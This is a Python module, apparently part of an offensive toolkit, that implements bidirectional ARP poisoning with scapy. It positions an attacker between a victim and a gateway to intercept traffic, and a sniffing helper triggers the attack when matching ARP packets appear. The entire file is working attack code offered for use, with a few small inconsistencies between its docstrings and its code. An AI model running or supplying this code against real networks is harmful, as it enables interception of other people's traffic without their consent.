"""
ARP Poisoning module for MITM attacks.

Performs bidirectional ARP spoofing to position the attacker between
victim and gateway, enabling traffic interception.
"""

# mypy: ignore-errors
import threading
import time

from scapy.all import (ARP, Ether, sendp, srp, sniff,)  # pylint: disable=no-name-in-module,import-error


def resolve_mac(ip: str, iface: str) -> str:
    """Resolve MAC address for a given IP using ARP."""
    print(f"[*] Resolving MAC for {ip} on {iface} ...")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=iface,
        verbose=False,
    )
    for _, pkt in ans:
        mac = pkt[Ether].src
        print(f"[+] {ip} is at {mac}")
        return mac
    raise RuntimeError(f"Could not resolve MAC for {ip}")


class ARPPoisoner:
    """
    Minimal ARP poisoner for victim <-> target MITM.
    """

    def __init__(
        self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0
    ):
        self.iface = iface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.interval = interval

        self.victim_mac = resolve_mac(victim_ip, iface)
        self.target_mac = resolve_mac(target_ip, iface)

        self._running = False
        self._thread: threading.Thread | None = None

    def _poison_once(self) -> None:
        """Send one round of poison packets to both victim and target."""
        # Tell victim: "target_ip is at attacker MAC"
        eth_to_victim = Ether(dst=self.victim_mac)
        pkt_to_victim = ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,
        )
        sendp(eth_to_victim / pkt_to_victim, iface=self.iface, verbose=False)

        # Tell target: "victim_ip is at attacker MAC"
        eth_to_target = Ether(dst=self.target_mac)
        pkt_to_target = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,
        )
        sendp(eth_to_target / pkt_to_target, iface=self.iface, verbose=False)

    def _restore(self) -> None:
        print("[*] Restoring ARP tables...")
        correct_to_victim = ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.target_ip,
            hwsrc=self.target_mac,
        )
        correct_to_target = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.victim_ip,
            hwsrc=self.victim_mac,
        )
        for _ in range(5):
            sendp(correct_to_victim, iface=self.iface, verbose=False)
            sendp(correct_to_target, iface=self.iface, verbose=False)
        print("[+] ARP tables restored")

    def _loop(self) -> None:
        """Background poisoning loop. Runs in its own thread."""
        print(
            f"[+] ARP poisoning thread started between {self.victim_ip} "
            f"<-> {self.target_ip} on {self.iface}"
        )
        print(f"[+] Interval: {self.interval} seconds")
        try:
            while self._running:
                self._poison_once()
                time.sleep(self.interval)
        finally:
            # Always try to repair ARP on exit
            self._restore()
            print("[*] ARP poisoning thread exiting.")

    def start(self) -> None:
        """Start ARP poisoning in a background thread."""
        if self._running:
            print("[*] ARPPoisoner already running.")
            return

        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Request poisoning to stop; thread will restore ARP and exit."""
        if not self._running:
            return
        print("[*] Stopping ARP poisoning...")
        self._running = False

    def join(self, timeout: float | None = None) -> None:
        """Optionally wait for the background thread to finish."""
        if self._thread is not None:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        """Check if the poisoner is currently running."""
        return self._running


def listen(
    victim_ip: str, target_ip: str, iface=["eth0", "eth1"]
) -> ARPPoisoner | None:
    """Listens for incoming ARP packets and checks if the packets originate from the target and are addressed to our victim"""
    while True:
        # Wait for an ARP packet
        pkt = sniff(iface=iface, filter="arp", count=1)

        # Extract ARP protocol information
        sniffed = pkt[0][ARP]

        # Determine whether or not this packet is useful to the attack
        if sniffed.psrc == victim_ip and sniffed.pdst == target_ip:
            # If so, return an instance that can be used to poison our target and victim
            return ARPPoisoner(iface=iface, victim_ip=victim_ip, target_ip=target_ip)
